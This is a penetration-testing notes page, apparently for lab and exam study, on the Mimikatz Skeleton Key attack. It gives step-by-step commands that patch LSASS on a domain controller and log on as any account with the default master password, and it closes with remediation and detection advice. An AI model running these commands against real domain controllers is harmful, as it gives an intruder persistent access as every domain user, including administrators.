# Skeleton Key Attack

Full syntax and every flag explained: [Mimikatz](../../tools/mimikatz.md)

> ⚠️ **Do NOT use during a real engagement.** Skeleton Key breaks Kerberos PKINIT / smartcard / certificate auth on the patched DC because it forces RC4 and downgrades the AES keys in LSASS. Any environment using ADCS, smartcards, or Windows Hello for Business will start failing logons — this is loud, disruptive, and immediately noticed. **Lab / exam use only.**

---

## What It Is

`mimikatz misc::skeleton` patches **LSASS on a Domain Controller** in memory so it accepts a single **master password ("mimikatz" by default)** for *any* domain account, while real users keep authenticating normally with their real passwords. Instant persistence as anyone — including Domain Admins — without touching passwords or dumping hashes.

---

## When You Use This

**You already have DA on a DC** and want quick, in-memory persistence without:
- Resetting any account password (noisy in logs)
- Dumping NTDS.dit (heavy on disk + EDR)
- Forging Golden Tickets (need krbtgt hash + SID)

**You do NOT use this if:**
- The DC might reboot — patch is in-memory only, lost on reboot
- The environment uses **certificates / smartcards / PKINIT** — you will break logons
- It's a real client engagement — see warning above

---

## Step by Step

### Step 1 — Get a shell on the DC as DA
```sh
# From a DA session
psexec.exe \\dc01.corp.local cmd
# or wmiexec / Enter-PSSession etc.
```

### Step 2 — Run Mimikatz elevated and patch LSASS
```sh
mimikatz # privilege::debug
mimikatz # misc::skeleton
# Output: "Patch OK for 'KdcsvcInitializeKDC' / 'CDCLocateKDC'"
```

### Step 3 — Authenticate as any user with the master password
```sh
# Default master password is literally:  mimikatz
# NTLM hash: 60BA4FCADC466C7A033C178194C03DF6

# Now any account works with password "mimikatz"
net use \\dc01.corp.local\C$ /user:corp\Administrator mimikatz
psexec.exe \\dc01.corp.local -u corp\Administrator -p mimikatz cmd

# Real users still log in with their real passwords — both work
```

---

## Skeleton Key vs Other Persistence

| | Skeleton Key | Golden Ticket | DSRM | Silver Ticket |
|---|---|---|---|---|
| **Needs** | DA on a DC | krbtgt hash + SID | DA on DC | Service hash + SID |
| **Survives reboot** | ❌ No (memory only) | ✅ Yes | ✅ Yes | ✅ Yes |
| **Breaks PKINIT/certs** | ✅ Yes — **noisy** | ❌ No | ❌ No | ❌ No |
| **Detection difficulty** | Easy (cert auth fails) | Hard | Medium | Hard |
| **Use when** | Lab / OSCP only | Long-term persistence | Backup DA | Stealthy service access |

**Rule of thumb:** Exam / lab → fine. Real engagement → use Golden / Silver / Diamond instead.

---

## Why It Breaks Certificate Auth

LSASS holds the per-account Kerberos keys. To accept the master password universally, the patch forces RC4-HMAC for all accounts and overwrites the AES keys. Anything that requires AES — **PKINIT (smartcards, Windows Hello for Business), ADCS-issued cert auth, kerberos-only services configured for AES** — will fail to authenticate against the patched DC. In environments with PKI, this is detected within minutes by failing logons.

---

## Remediation (For Report Writing)

**Root cause:** An attacker with DA privileges on a DC patched LSASS in-memory, adding a universal master password for all domain accounts.

| Finding | Remediation |
|---|---|
| LSASS patched on DC | **Reboot the DC** — the patch is in-memory only and does not persist. |
| DA was obtained on a DC | Treat as full domain compromise. Rotate krbtgt twice, rotate all privileged accounts, audit how DA was achieved. |
| No LSASS protection | Enable **LSA Protection (RunAsPPL)** and **Credential Guard** on all DCs — blocks Mimikatz from injecting into LSASS without a signed driver. |
| No EDR on DCs | Deploy EDR with LSASS access monitoring — Skeleton Key triggers on LSASS write/patch behavior. |
| Cert/smartcard logons failing intermittently | Investigate for Skeleton Key or other LSASS tampering — sudden PKINIT failures on one DC with NTLM still working is the signature. |

---

## See Also
- [Mimikatz](../../tools/mimikatz.md) — `misc::skeleton` and other LSASS tricks
- [Golden Ticket](golden-ticket.md) — persistent alternative that survives reboot
- [Dumping NTDS.dit](dumping-ntds.md) — heavier but persistent credential theft
